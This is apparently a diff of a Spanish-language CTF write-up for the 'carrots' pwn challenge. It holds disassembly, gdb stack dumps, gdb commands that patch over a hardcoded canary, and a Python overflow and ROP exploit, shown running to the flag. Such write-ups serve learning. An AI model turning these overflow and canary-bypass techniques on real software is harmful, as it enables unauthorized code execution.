@@ -179,39 +179,56 @@ Mmm... no creo que sea casualidad que haya 'AAAA' en esa posición de memoria. S
  ...........
  80497cd:	89 85 74 ff ff ff    	mov    DWORD PTR [ebp-0x8c],eax
  80497d3:	e8 c8 f7 ff ff       	call   8048fa0                          <== Función vulnerable que recoge los datos introducidos
- 80497d8:	81 7d f8 00 00 00 00 	cmp    DWORD PTR [ebp-0x8],0x0          <== Comprueba si es 0 el valor de var_8 (1ª comprobación)
+ 80497d8:	81 7d f8 00 00 00 00 	cmp    DWORD PTR [ebp-0x8],0x0          <== Comprueba si ha habido algún error en la llamada a la función
  80497df:	89 85 70 ff ff ff    	mov    DWORD PTR [ebp-0x90],eax
- 80497e5:	0f 85 14 00 00 00    	jne    80497ff <main+0x6f>              <== Si no es 0 salta a exit
+ 80497e5:	0f 85 14 00 00 00    	jne    80497ff <main+0x6f>              <== Si hay un error ($eax<>0) sigue y sale del programa
  80497eb:	31 c0                	xor    eax,eax
  80497ed:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
  80497f4:	89 85 6c ff ff ff    	mov    DWORD PTR [ebp-0x94],eax
  80497fa:	e8 a1 f8 ff ff       	call   80490a0 <exit@plt>
- 80497ff:	31 c0                	xor    eax,eax                         <== Si se cumle la 1ª condición sigue por aquí
+ 80497ff:	31 c0                	xor    eax,eax                         <== Sigue por aquí si no ha habido un error
  8049801:	8b 4d f8             	mov    ecx,DWORD PTR [ebp-0x8]         <== Recupera el valor de var_8   
  8049804:	89 0d d0 c1 04 08    	mov    DWORD PTR ds:0x804c1d0,ecx      <== Guarda var_8 en la posición 0x804c1d0
  804980a:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]         <== Recupera el valor del canary hardcodeado guardado en var_4
  804980d:	89 0d d4 c1 04 08    	mov    DWORD PTR ds:0x804c1d4,ecx      <== Guarda el valor hardcodeado en la posición 0x804c1d4
- 8049813:	8b 4d 04             	mov    ecx,DWORD PTR [ebp+0x4]         <== Recupera el valor del canary hardcodeado guardado en var_4
- 8049816:	89 0d d8 c1 04 08    	mov    DWORD PTR ds:0x804c1d8,ecx      <== Guarda el valor hardcodeado en la posición 0x804c1d4
+ 8049813:	8b 4d 04             	mov    ecx,DWORD PTR [ebp+0x4]         <== Recupera un valor del stack frame previo
+ 8049816:	89 0d d8 c1 04 08    	mov    DWORD PTR ds:0x804c1d8,ecx      <== Guarda el valor anterior en la posición 0x804c1d8
  804981c:	81 c4 a8 00 00 00    	add    esp,0xa8
  8049822:	5d                   	pop    ebp
  8049823:	c3                   	ret                                   
 ```
 
-
-
-x/32xw $ebp-0x4
-0xbffff334:	0x42495244	0x00000000	0xb7c24276	0x00000001
-
+Si observamos la pila antes de meter el offset en nuestra función de recogida de datos tenemos los siguientes valores:
 
 ```
-br *0x804981c
+x/32xw $ebp-0x4
+0xbffff334:	0x42495244	0x00000000	0xb7c24276	0x00000001
+```
 
+Si la observamos después de meter el offset de 140 caracteres, se puede comprobar que hemos machadado tres valores que guarda en memoria y que luego va a usar para saber si hemos modificado la pila:
+
+```
+gdb-peda$ x/32xw $ebp-0x4
+0xbffff334:	0x41414141	0x42424242	0xb7c24200	0x00000001
+```
+
+Ok, entonces no solo tenemos que poner la dirección donde queremos enviar el flujo del programa además debemos mantener esos valores para que no nos dé el error anterior. Para eso cambiamos los valores en gdb para evitar el canary:
+
+```
 set {int}0xbffff334=0x42495244
 set {int}0xbffff338=0x00000000
 set {int}0xbffff33c=0x08049570
-evitar canary
 ```
+
+Si seguimos la ejeucción del programa dentro del gdb nos da lo siguiente:
+
+```
+Yes! My Carrot is here! mmmm ... 
+fwhibbit{Carrots_for_All_dabd8800}
+```
+
+Ya tenemos el flag, pero si lo introducimos en el panel del CTF nos dice que no es correcto. WTF!!!!
+Aquí es donde me ofusque con este reto y empecé a hacer todo tipo de pruebas dentro de gdb para ver porque esa no era el flag correcto. Después de medio día perdido volviendome loco y gracias a consultar con un admin del CTF que me dijo que no tenía que hacer el reversing del binario sino que explotarlo, entendí que tenía que ejecutar el exploit fuera del gdb porque los últimos valores del flag(dabd8800) eran el valor de una posición de memoria. Y cuando ejecutas el programa para debugearlo esas posiciones son diferentes a cuando lo haces directamente sobre el sistema. Por lo tanto hice mi cutre script en python y así conseguí explotar el programa. :-)
 
 ```python
 #!/usr/bin/python
@@ -232,3 +249,37 @@ rop += pack('<I', 0x08049570)
 payload = junk + rop 
 print payload
 ```
+
+Por fin la solución final:
+
+```
+root@LOL:~/fwhibbitCTF/pwn# python explotalo.py > file.txt 
+root@LOL:~/fwhibbitCTF/pwn# ./carrots < file.txt 
+
+        .--``..---.                
+         .````--:ohdmNms/`         
+          -:/+++/-.:smNd+          
+       ```..--:ohmNNdhh.           
+     `-. `.``.-+sosshd.         :. 
+   -os--/sosdmmNNMMNy         .+// 
+  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
+ .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
+ `yohNhNNNMh-           dosNMMMmo- 
+  -mN+hMMMy             .smNMNdd/+`
+   yN.hMMh               +NMMNmhds:
+   +N//m+                 .osshyho 
+  ..smhh                           
+   ::oNmy-                         
+      .//yhs/:`                    
+          :ymNN/                   
+         .-+shdho.                 
+             `.--..` '''   
+
+ Where is my carrot?
+ > 
+ Yes! My Carrot is here! mmmm ... 
+ fwhibbit{Carrots_for_All_160591c0}
+Segmentation fault
+```
+
+
